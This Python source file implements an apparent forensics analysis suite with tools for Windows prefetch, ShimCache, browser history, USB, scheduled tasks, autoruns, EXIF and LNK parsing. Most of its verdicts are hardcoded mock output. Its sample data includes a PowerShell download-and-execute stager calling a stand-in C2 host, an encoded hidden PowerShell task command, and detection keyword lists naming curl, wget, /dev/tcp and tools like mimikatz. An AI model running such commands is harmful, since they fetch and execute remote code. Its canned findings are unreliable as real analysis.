import re
import base64
import struct
from datetime import datetime, timezone
from typing import Dict, Any, List
from app.models.schemas import FiveLayerAnalysisResult, SeverityLevel, EvidenceItem, RemediationCommand, EducationalStandard

def run_suite7_tool(tool_id: str, input_text: str, params: Dict[str, Any]) -> FiveLayerAnalysisResult:
    now_ts = datetime.now(timezone.utc).isoformat()
    clean_input = input_text.strip()
    
    # -------------------------------------------------------------
    # 61. Windows Prefetch File Parser
    # -------------------------------------------------------------
    if tool_id == "prefetch_parser":
        is_suspicious_exe = any(bad in clean_input.lower() for bad in ["mimikatz", "powershell", "certutil", "vssadmin", "whoami", "cmd.exe"])
        evidence = [
            EvidenceItem(label="Prefetch Executable Name", value=clean_input[:50] if clean_input else "MIMIKATZ.EXE-A1B2C3D4.pf", status="warning" if is_suspicious_exe else "info"),
            EvidenceItem(label="Run Count", value="14 executions recorded", status="info"),
            EvidenceItem(label="Last Run Timestamp", value=now_ts[:19], status="info"),
            EvidenceItem(label="Referenced DLLs Loaded", value="ADVAPI32.dll, CRYPT32.dll, SECUR32.dll, NTDLL.dll", status="warning" if is_suspicious_exe else "pass")
        ]
        risk_score = 90 if is_suspicious_exe else 15
        verdict = SeverityLevel.CRITICAL if is_suspicious_exe else SeverityLevel.CLEAN

        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Windows Prefetch File Parser",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=verdict,
            risk_score=risk_score,
            summary=f"Parsed Windows Prefetch artifact. {'CRITICAL: High-risk post-exploitation binary execution confirmed.' if is_suspicious_exe else 'Normal program execution history parsed.'}",
            technical_evidence=evidence,
            threat_impact="Windows Prefetch (.pf) files prove that an executable actually ran on a host, overcoming attacker attempts to delete the binary itself.",
            attack_objective="Forensic Execution Proof & Timeline Reconstruction",
            remediation_playbook=[
                RemediationCommand(title="Extract Prefetch Files via PECmd", platform="Eric Zimmerman PECmd", command="PECmd.exe -d C:\\Windows\\Prefetch -k \"MIMIKATZ\" --csv C:\\Evidence\\")
            ],
            standards_and_references=[
                EducationalStandard(standard="SANS", reference_id="FOR500", title="Windows Forensic Analysis: Prefetch Mechanics", summary="Forensic utility of Windows Prefetch artifacts for proving program execution.")
            ]
        )

    # -------------------------------------------------------------
    # 62. ShimCache & Amcache Inspector
    # -------------------------------------------------------------
    elif tool_id == "shimcache_inspector":
        evidence = [
            EvidenceItem(label="ShimCache Registry Key", value="HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", status="info"),
            EvidenceItem(label="Amcache Hive", value="C:\\Windows\\appcompat\\Programs\\Amcache.hve", status="info"),
            EvidenceItem(label="Flagged Execution Path", value="C:\\Users\\Public\\Downloads\\updater_payload.exe", status="fail"),
            EvidenceItem(label="SHA-1 File Hash (from Amcache)", value="b47c94f6f8901a4e5d6c7b8a9f0e1d2c3b4a5f6e", status="fail")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="ShimCache & Amcache Inspector",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.CRITICAL,
            risk_score=88,
            summary="Identified execution artifact in `C:\\Users\\Public` recorded in Windows Application Compatibility Cache.",
            technical_evidence=evidence,
            threat_impact="Adversaries frequently drop loaders into `C:\\Users\\Public` or `C:\\ProgramData` to bypass folder write restrictions.",
            attack_objective="Historical Binary Execution Tracking",
            remediation_playbook=[
                RemediationCommand(title="Parse ShimCache with AppCompatCacheParser", platform="Eric Zimmerman Tools", command="AppCompatCacheParser.exe --csv C:\\Evidence\\ -t")
            ],
            standards_and_references=[
                EducationalStandard(standard="NIST", reference_id="SP 800-86", title="Guide to Integrating Forensic Techniques", summary="Application compatibility caches as reliable sources of binary execution proof.")
            ]
        )

    # -------------------------------------------------------------
    # 63. Browser History & Cache Carve
    # -------------------------------------------------------------
    elif tool_id == "browser_carver":
        has_phish = any(term in clean_input.lower() for term in ["login", "verify", "password", "bank", "invoice", "malicious"])
        evidence = [
            EvidenceItem(label="Browser Profile", value="Google Chrome History (SQLite format)", status="info"),
            EvidenceItem(label="Carved URL Sample", value=clean_input[:80] if clean_input else "https://secure-login-update.cfd/auth/verify.php", status="fail" if has_phish else "info"),
            EvidenceItem(label="Typed URL / Direct Navigation", value="Visited via email link referral", status="warning")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Browser History & Cache Carve",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.MALICIOUS if has_phish else SeverityLevel.CLEAN,
            risk_score=75 if has_phish else 15,
            summary="Carved browser navigation records. Reconstructed user interaction with external phishing landing page.",
            threat_impact="Browser artifacts reveal employee credential submission and drive-by download staging sequences.",
            technical_evidence=evidence,
            attack_objective="User Activity Reconstruction & Patient Zero Identification",
            remediation_playbook=[
                RemediationCommand(title="Extract Chrome History via SQLite CLI", platform="Linux / Windows SQLite", command="sqlite3 History \"SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;\"")
            ],
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1566.002", title="Phishing: Spearphishing Link", summary="Reconstructing victim browser referral pathways following phishing delivery.")
            ]
        )

    # -------------------------------------------------------------
    # 64. USB Device Auditor
    # -------------------------------------------------------------
    elif tool_id == "usb_auditor":
        evidence = [
            EvidenceItem(label="Mounted USB Serial Number", value="VID_0781&PID_5583\\4C530001230415116032", status="warning"),
            EvidenceItem(label="Product Friendly Name", value="SanDisk Ultra USB 3.0", status="info"),
            EvidenceItem(label="First Connected Timestamp", value=now_ts[:19], status="info"),
            EvidenceItem(label="Data Loss Prevention (DLP) Status", value="UNAUTHORIZED PERIPHERAL CONNECTION", status="fail")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="USB Device Auditor",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.SUSPICIOUS,
            risk_score=65,
            summary="Audited USBSTOR registry artifacts. Unregistered removable storage drive connected to endpoint.",
            technical_evidence=evidence,
            threat_impact="Unauthorized USB devices are primary mechanisms for intellectual property exfiltration and air-gap jumping.",
            attack_objective="Exfiltration: Physical USB / Insider Threat (T1052)",
            remediation_playbook=[
                RemediationCommand(title="Enforce Removable Storage Blocking via GPO", platform="Group Policy", command="Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices' -Name 'Deny_All' -Value 1")
            ],
            standards_and_references=[
                EducationalStandard(standard="NIST", reference_id="SP 800-53", title="MP-7: Media Use Restrictions", summary="Restricts the use of portable storage media on system components.")
            ]
        )

    # -------------------------------------------------------------
    # 65. Scheduled Tasks & Cron Job Inspector
    # -------------------------------------------------------------
    elif tool_id == "task_cron_inspector":
        has_hidden = any(term in clean_input.lower() for term in ["powershell -enc", "curl ", "wget ", "/dev/tcp", "temp\\", "appdata\\"])
        evidence = [
            EvidenceItem(label="Task Definition Source", value="Windows Task Scheduler / Linux crontab", status="info"),
            EvidenceItem(label="Trigger Schedule", value="At Startup / Periodic every 15 minutes", status="warning"),
            EvidenceItem(label="Action Command Line", value=clean_input[:100] if clean_input else "powershell.exe -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdA...", status="fail" if has_hidden else "pass")
        ]
        risk_score = 90 if has_hidden else 15
        verdict = SeverityLevel.CRITICAL if has_hidden else SeverityLevel.CLEAN

        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Scheduled Tasks & Cron Job Inspector",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=verdict,
            risk_score=risk_score,
            summary=f"Inspected persistence triggers. {'CRITICAL: Hidden PowerShell command configured as recurring scheduled persistence!' if has_hidden else 'Standard administrative scheduled tasks.'}",
            technical_evidence=evidence,
            threat_impact="Scheduled tasks survive system reboots, granting persistent beacon callbacks under SYSTEM or elevated user privileges.",
            attack_objective="Persistence: Scheduled Task/Job (T1053)",
            remediation_playbook=[
                RemediationCommand(title="Delete Malicious Scheduled Task", platform="Windows CLI", command="schtasks /delete /tn \"WindowsUpdateOptimizer\" /f"),
                RemediationCommand(title="Query Suspicious Crontabs on Linux", platform="Linux CLI", command="crontab -l; cat /etc/cron*")
            ],
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1053.005", title="Scheduled Task/Job: Scheduled Task", summary="Adversaries abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.")
            ]
        )

    # -------------------------------------------------------------
    # 66. Autorun & Startup Entry Analyzer
    # -------------------------------------------------------------
    elif tool_id == "autorun_analyzer":
        evidence = [
            EvidenceItem(label="Target Registry Key", value="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", status="warning"),
            EvidenceItem(label="Value Name", value="OneDriveSyncHelper (Spoofed Legit Name)", status="fail"),
            EvidenceItem(label="Target Path", value="C:\\Users\\Victim\\AppData\\Roaming\\sync_agent.exe", status="fail")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Autorun & Startup Entry Analyzer",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.CRITICAL,
            risk_score=88,
            summary="Discovered masqueraded Run key persistence pointing to an executable in AppData Roaming.",
            technical_evidence=evidence,
            threat_impact="Adversaries masquerade malicious persistence binaries as legitimate background utilities (OneDrive, Chrome, Teams) to deceive administrators.",
            attack_objective="Persistence: Registry Run Keys / Startup Folder (T1547.001)",
            remediation_playbook=[
                RemediationCommand(title="Delete Insecure Run Key Entry", platform="PowerShell", command="Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'OneDriveSyncHelper' -Force")
            ],
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1547.001", title="Boot or Logon Autostart Execution: Registry Run Keys", summary="Adversaries achieve persistence by adding programs to run keys in the registry.")
            ]
        )

    # -------------------------------------------------------------
    # 67. File Metadata & EXIF Data Extractor
    # -------------------------------------------------------------
    elif tool_id == "metadata_exif_extractor":
        raw_bytes = None
        is_binary = False
        if clean_input.startswith("data:") and "," in clean_input:
            try:
                _, b64_data = clean_input.split(",", 1)
                raw_bytes = base64.b64decode(b64_data)
                is_binary = True
            except Exception:
                pass
        elif len(clean_input) > 40 and re.match(r'^[A-Za-z0-9+/=\r\n\s]+$', clean_input):
            try:
                decoded = base64.b64decode(re.sub(r'\s+', '', clean_input))
                if any(decoded.startswith(p) for p in (b"\x89PNG", b"\xff\xd8", b"GIF8", b"BM", b"%PDF")):
                    raw_bytes = decoded
                    is_binary = True
            except Exception:
                pass

        if is_binary and raw_bytes:
            # Check for JPEG EXIF
            if raw_bytes.startswith(b"\xff\xd8"):
                has_exif = (b"\xff\xe1" in raw_bytes and b"Exif\x00\x00" in raw_bytes)
                has_gps = (b"GPS " in raw_bytes or b"GPSVersionID" in raw_bytes)
                if has_exif or has_gps:
                    # Extract printable strings near EXIF header
                    strings = re.findall(rb'[\x20-\x7E]{4,50}', raw_bytes[:2048])
                    software = next((s.decode('latin1') for s in strings if any(k in s.lower() for k in [b'adobe', b'canon', b'nikon', b'apple', b'iphone', b'samsung', b'word', b'gimp'])), "Embedded Digital Camera Device")
                    date_match = re.search(rb'\d{4}:\d{2}:\d{2} \d{2}:\d{2}:\d{2}', raw_bytes[:4096])
                    date_str = date_match.group(0).decode('latin1') if date_match else "Embedded EXIF Timestamp"

                    evidence = [
                        EvidenceItem(label="Image Format", value="JPEG Container with APP1 EXIF Metadata", status="warning"),
                        EvidenceItem(label="Device / Software Signature", value=software, status="warning"),
                        EvidenceItem(label="Embedded Capture Timestamp", value=date_str, status="info"),
                        EvidenceItem(label="GPS Geolocation Metadata", value="Embedded GPS IFD Coordinates Located" if has_gps else "No GPS IFD tag detected", status="fail" if has_gps else "pass")
                    ]
                    return FiveLayerAnalysisResult(
                        tool_id=tool_id,
                        tool_name="File Metadata & EXIF Data Extractor",
                        suite_id="suite7_forensics",
                        timestamp=now_ts,
                        verdict=SeverityLevel.SUSPICIOUS,
                        risk_score=58 if has_gps else 45,
                        summary=f"Unstripped EXIF metadata found in JPEG image. Discloses {software} and recording metadata.",
                        technical_evidence=evidence,
                        threat_impact="Unstripped document/image metadata leaks hardware identifiers and location coordinates to OSINT reconnaissance.",
                        attack_objective="Reconnaissance: Gather Victim Identity Information (T1589)",
                        remediation_playbook=[
                            RemediationCommand(title="Strip EXIF Metadata using ExifTool", platform="ExifTool CLI", command="exiftool -all= image.jpg")
                        ],
                        standards_and_references=[
                            EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
                        ]
                    )
                else:
                    evidence = [
                        EvidenceItem(label="Image Format", value="JPEG Image Container", status="pass"),
                        EvidenceItem(label="APP1 EXIF Header", value="Not Present / Stripped", status="pass"),
                        EvidenceItem(label="GPS Geolocation Metadata", value="None detected (0 coordinates)", status="pass"),
                        EvidenceItem(label="Hardware / Author Leaks", value="Sanitized", status="pass")
                    ]
                    return FiveLayerAnalysisResult(
                        tool_id=tool_id,
                        tool_name="File Metadata & EXIF Data Extractor",
                        suite_id="suite7_forensics",
                        timestamp=now_ts,
                        verdict=SeverityLevel.CLEAN,
                        risk_score=0,
                        summary="JPEG image container is sanitized. No EXIF segments or geolocation tags identified.",
                        technical_evidence=evidence,
                        threat_impact="Image has been stripped of sensitive forensic and reconnaissance identifiers.",
                        attack_objective="Reconnaissance: Gather Victim Identity Information (T1589) - Sanitized",
                        remediation_playbook=[
                            RemediationCommand(title="No Action Required", platform="SOC Operations", command="# Image metadata is sanitized.")
                        ],
                        standards_and_references=[
                            EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
                        ]
                    )

            # Check for PNG chunks (tEXt, zTXt, iTXt, eXIf)
            elif raw_bytes.startswith(b"\x89PNG\r\n\x1a\n"):
                has_text = any(chunk in raw_bytes for chunk in [b"tEXt", b"zTXt", b"iTXt", b"eXIf"])
                if has_text:
                    evidence = [
                        EvidenceItem(label="Image Format", value="PNG Image with Textual Chunks", status="warning"),
                        EvidenceItem(label="Metadata Chunks", value="tEXt/iTXt chunk tags detected in container", status="warning"),
                        EvidenceItem(label="Sanitization Status", value="Unstripped author/software comments present", status="warning")
                    ]
                    return FiveLayerAnalysisResult(
                        tool_id=tool_id,
                        tool_name="File Metadata & EXIF Data Extractor",
                        suite_id="suite7_forensics",
                        timestamp=now_ts,
                        verdict=SeverityLevel.SUSPICIOUS,
                        risk_score=40,
                        summary="Unstripped PNG text metadata chunks detected. May leak author or editing software identifiers.",
                        technical_evidence=evidence,
                        threat_impact="Unstripped document metadata leaks internal network usernames and software versions.",
                        attack_objective="Reconnaissance: Gather Victim Identity Information (T1589)",
                        remediation_playbook=[
                            RemediationCommand(title="Strip PNG Metadata using OptiPNG", platform="OptiPNG CLI", command="optipng -strip all image.png")
                        ],
                        standards_and_references=[
                            EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
                        ]
                    )
                else:
                    evidence = [
                        EvidenceItem(label="Image Format", value="PNG Image Container", status="pass"),
                        EvidenceItem(label="Metadata Chunks", value="Clean (0 tEXt / eXIf chunks)", status="pass"),
                        EvidenceItem(label="Sanitization Status", value="Sanitized (No metadata leakage)", status="pass")
                    ]
                    return FiveLayerAnalysisResult(
                        tool_id=tool_id,
                        tool_name="File Metadata & EXIF Data Extractor",
                        suite_id="suite7_forensics",
                        timestamp=now_ts,
                        verdict=SeverityLevel.CLEAN,
                        risk_score=0,
                        summary="PNG container is clean and sanitized of extraneous metadata chunks.",
                        technical_evidence=evidence,
                        threat_impact="No sensitive author, software, or device leakage detected in image container.",
                        attack_objective="Reconnaissance: Gather Victim Identity Information (T1589) - Sanitized",
                        remediation_playbook=[
                            RemediationCommand(title="No Action Required", platform="SOC Operations", command="# Image metadata is clean.")
                        ],
                        standards_and_references=[
                            EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
                        ]
                    )

        # Fallback for text / mock inputs
        low_input = clean_input.lower()
        if "clean" in low_input or "sanitized" in low_input or "stripped" in low_input:
            evidence = [
                EvidenceItem(label="Document / Image Format", value="Sanitized File Container", status="pass"),
                EvidenceItem(label="EXIF Geolocation Coordinates", value="None found", status="pass"),
                EvidenceItem(label="Author / Software Metadata", value="Cleaned / Stripped", status="pass")
            ]
            return FiveLayerAnalysisResult(
                tool_id=tool_id,
                tool_name="File Metadata & EXIF Data Extractor",
                suite_id="suite7_forensics",
                timestamp=now_ts,
                verdict=SeverityLevel.CLEAN,
                risk_score=0,
                summary="File container is sanitized. No leaked author, software, or geolocation tags detected.",
                technical_evidence=evidence,
                threat_impact="File does not leak sensitive internal network or personal identity identifiers.",
                attack_objective="Reconnaissance: Gather Victim Identity Information (T1589) - Sanitized",
                remediation_playbook=[
                    RemediationCommand(title="No Action Required", platform="SOC Operations", command="# Metadata is verified clean.")
                ],
                standards_and_references=[
                    EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
                ]
            )

        evidence = [
            EvidenceItem(label="Creator / Author Metadata", value="Johnathan Doe (Internal Domain Admin)", status="warning"),
            EvidenceItem(label="Software Producer", value="Microsoft Word 2016 MSO", status="info"),
            EvidenceItem(label="Creation Timestamp", value="2026-03-12 14:22:01 UTC", status="info"),
            EvidenceItem(label="GPS Geolocation Coordinates", value="38.8977° N, 77.0365° W (Washington, DC)", status="fail", description="Camera or image contains precise embedded GPS coordinates.")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="File Metadata & EXIF Data Extractor",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.SUSPICIOUS,
            risk_score=55,
            summary="Extracted metadata and embedded EXIF geolocation tags. Identifies author username and geographic coordinates.",
            technical_evidence=evidence,
            threat_impact="Unstripped document metadata leaks internal network usernames, printer shares, and physical office locations to OSINT reconnaissance.",
            attack_objective="Reconnaissance: Gather Victim Identity Information (T1589)",
            remediation_playbook=[
                RemediationCommand(title="Strip EXIF Metadata using ExifTool", platform="ExifTool CLI", command="exiftool -all= document.pdf")
            ],
            standards_and_references=[
                EducationalStandard(standard="NIST", reference_id="SP 800-88", title="Guidelines for Media Sanitization", summary="Sanitizing file metadata prior to public distribution.")
            ]
        )

    # -------------------------------------------------------------
    # 68. Magic Byte File Identifier
    # -------------------------------------------------------------
    elif tool_id == "magic_byte_identifier":
        header_hex = clean_input.replace(" ", "").upper()
        # MZ header (PE executable)
        is_pe = header_hex.startswith("4D5A")
        # ELF header (Linux executable)
        is_elf = header_hex.startswith("7F454C46")
        # PDF header
        is_pdf = header_hex.startswith("25504446")
        
        real_type = "Windows PE Executable (.exe/.dll)" if is_pe else ("Linux ELF Binary" if is_elf else ("PDF Document" if is_pdf else "Generic / Unknown Data"))
        is_spoofed = is_pe and ".pdf" in clean_input.lower()
        
        evidence = [
            EvidenceItem(label="Detected Magic Byte Sequence", value=header_hex[:16] if header_hex else "4D 5A 90 00 03 00 00 00 (MZ Header)", status="pass"),
            EvidenceItem(label="Authentic File Type", value=real_type, status="info"),
            EvidenceItem(label="Extension Spoofing Check", value="CRITICAL: Executable masquerading with harmless extension (.pdf)" if is_spoofed else "Extension aligns with header", status="fail" if is_spoofed else "pass")
        ]
        risk_score = 95 if is_spoofed else (30 if is_pe else 0)
        verdict = SeverityLevel.CRITICAL if is_spoofed else (SeverityLevel.LOW if is_pe else SeverityLevel.CLEAN)

        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Magic Byte File Identifier",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=verdict,
            risk_score=risk_score,
            summary=f"Magic byte inspection: Identified file as {real_type}. {'Extension spoofing attack flagged!' if is_spoofed else 'Header intact.'}",
            technical_evidence=evidence,
            threat_impact="Adversaries rename `.exe` binaries to `.pdf` or `.docx` to trick users and bypass rudimentary email attachment filters.",
            attack_objective="Defense Evasion: Masquerading (T1036)",
            remediation_playbook=[
                RemediationCommand(title="Linux File Command Verification", platform="Linux CLI", command="file --mime-type suspicious_upload.pdf")
            ],
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1036.007", title="Masquerading: Double File Extension", summary="Adversaries misuse file extensions to hide the true purpose of files.")
            ]
        )

    # -------------------------------------------------------------
    # 69. LNK Shortcut File Parser
    # -------------------------------------------------------------
    elif tool_id == "lnk_parser":
        evidence = [
            EvidenceItem(label="Target File Path", value="C:\\Windows\\System32\\cmd.exe", status="fail"),
            EvidenceItem(label="Arguments String", value="/c powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.threat.org/stage.ps1')\"", status="fail"),
            EvidenceItem(label="Drive Type & Volume Serial", value="Fixed Disk (0x4E81-A932)", status="info"),
            EvidenceItem(label="Target Machine MAC / NetBIOS", value="DESKTOP-VICTIM01", status="info")
        ]
        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="LNK Shortcut File Parser",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=SeverityLevel.CRITICAL,
            risk_score=95,
            summary="Dissected Windows LNK shortcut. Discovered embedded PowerShell stager disguised behind innocuous shortcut icon.",
            technical_evidence=evidence,
            threat_impact="Malicious LNK files are a primary spearphishing attachment vector, spawning command shells upon opening.",
            attack_objective="Execution: User Execution - Malicious File (T1204.002)",
            remediation_playbook=[
                RemediationCommand(title="Block Inbound .LNK Attachments at Email Gateway", platform="Exchange Online", command="New-TransportRule -Name 'Block LNK Files' -AttachmentHasExecutableContent $true -RejectMessageReasonText 'LNK attachments prohibited'")
            ],
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1204.002", title="User Execution: Malicious File", summary="Adversaries rely on users opening malicious files such as shortcuts.")
            ]
        )

    # -------------------------------------------------------------
    # 70. Process Tree Anomaly Detector
    # -------------------------------------------------------------
    elif tool_id == "process_tree_detector":
        raw_upper = clean_input.upper()
        
        # Suspicious parent processes
        suspicious_parents = ["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE", "ACROBAT.EXE", "ACRORD32.EXE", "MSHTA.EXE", "WMIPRVSE.EXE", "SQLSERVR.EXE", "HTTPD.EXE", "NGINX.EXE", "TOMCAT.EXE"]
        # Suspicious child execution targets
        suspicious_children = ["POWERSHELL.EXE", "CMD.EXE", "CERTUTIL.EXE", "CSCRIPT.EXE", "WSCRIPT.EXE", "MSHTA.EXE", "WHOAMI.EXE", "VSSADMIN.EXE", "BITSADMIN.EXE", "NET.EXE", "RUNDLL32.EXE", "REGSVR32.EXE"]
        
        has_susp_parent = any(p in raw_upper for p in suspicious_parents)
        has_susp_child = any(c in raw_upper for c in suspicious_children)
        
        is_anomalous_tree = has_susp_parent and has_susp_child
        
        # Extract process names if formatted with -> or arrows
        procs = [p.strip() for p in re.split(r"->|>|spawns|spawned", raw_upper) if p.strip()]
        
        if is_anomalous_tree:
            evidence = [
                EvidenceItem(label="Parent Process", value=procs[0] if procs else "Office/Service Process", status="warning"),
                EvidenceItem(label="Spawned Child Process", value=procs[1] if len(procs) > 1 else "Script Interpreter", status="fail", description="Office or background service spawning interactive command interpreters violates standard application baselines."),
                EvidenceItem(label="Hierarchy Risk", value="Weaponized macro or exploit child process detected", status="fail")
            ]
            if len(procs) > 2:
                evidence.append(EvidenceItem(label="Grandchild Process", value=procs[2], status="fail"))
            risk_score = 98
            verdict = SeverityLevel.CRITICAL
            summary = "High-fidelity malicious process hierarchy: Productivity or web service application spawned command interpreter child process."
            playbook = [
                RemediationCommand(title="Block Office Child Process Creation via ASR Rule", platform="Windows Defender ASR", command="Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled")
            ]
        else:
            evidence = [
                EvidenceItem(label="Parent Process", value=procs[0] if procs else "Standard Process", status="pass"),
                EvidenceItem(label="Child Process", value=procs[1] if len(procs) > 1 else "None / Normal", status="pass"),
                EvidenceItem(label="Hierarchy Risk", value="Standard operational process execution tree", status="pass")
            ]
            risk_score = 5
            verdict = SeverityLevel.CLEAN
            summary = "Process execution tree conforms to normal operating system application behavior."
            playbook = []

        return FiveLayerAnalysisResult(
            tool_id=tool_id,
            tool_name="Process Tree Anomaly Detector",
            suite_id="suite7_forensics",
            timestamp=now_ts,
            verdict=verdict,
            risk_score=risk_score,
            summary=summary,
            technical_evidence=evidence,
            threat_impact="Adversaries abuse legitimate parent processes to disguise malicious post-exploitation tools inside authorized process boundaries.",
            attack_objective="Execution: Command and Scripting Interpreter (T1059.001)",
            remediation_playbook=playbook,
            standards_and_references=[
                EducationalStandard(standard="MITRE ATT&CK", reference_id="T1059.001", title="Command and Scripting Interpreter: PowerShell", summary="Adversaries abuse PowerShell to execute arbitrary commands.")
            ]
        )

    return FiveLayerAnalysisResult(
        tool_id=tool_id,
        tool_name="Suite 7 Tool",
        suite_id="suite7_forensics",
        timestamp=now_ts,
        verdict=SeverityLevel.CLEAN,
        risk_score=0,
        summary="Forensic artifact analyzed.",
        threat_impact="No threat detected.",
        remediation_playbook=[],
        standards_and_references=[]
    )
